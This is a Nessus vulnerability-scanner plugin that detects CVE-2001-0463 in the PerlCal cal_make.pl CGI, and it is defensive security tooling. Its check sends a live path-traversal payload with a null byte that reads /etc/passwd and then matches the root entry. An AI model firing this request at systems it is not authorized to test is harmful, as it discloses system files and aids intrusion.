#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10664);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2001-0463");
 script_bugtraq_id(2663);
 script_osvdb_id(550);
 
 script_name(english:"PerlCal cal_make.pl p0 Parameter Traversal Arbitrary File Read");
 
 script_set_attribute(attribute:"synopsis", value:
"It may be possible to read arbitrary files from the remote
system." );
 script_set_attribute(attribute:"description", value:
"The 'cal_make.pl' cgi is installed on the remote host. This
CGI has a well known security flaw that lets anyone read 
arbitrary files with the privileges of the http daemon 
(root or nobody)." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/05/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/04/27");
 script_cvs_date("$Date: 2011/03/14 21:48:09 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();
 
 script_summary(english:"Checks for the presence of /cgi-bin/cal_make.pl");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 data = string(dir, "/cal_make.pl?p0=../../../../../../../../../etc/passwd%00");
 res = http_send_recv3(port:port, method:"GET", item:data);
 if( isnull(res)) exit(1,"Null response to cal_make.pl request.");
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2]))security_hole(port);
}
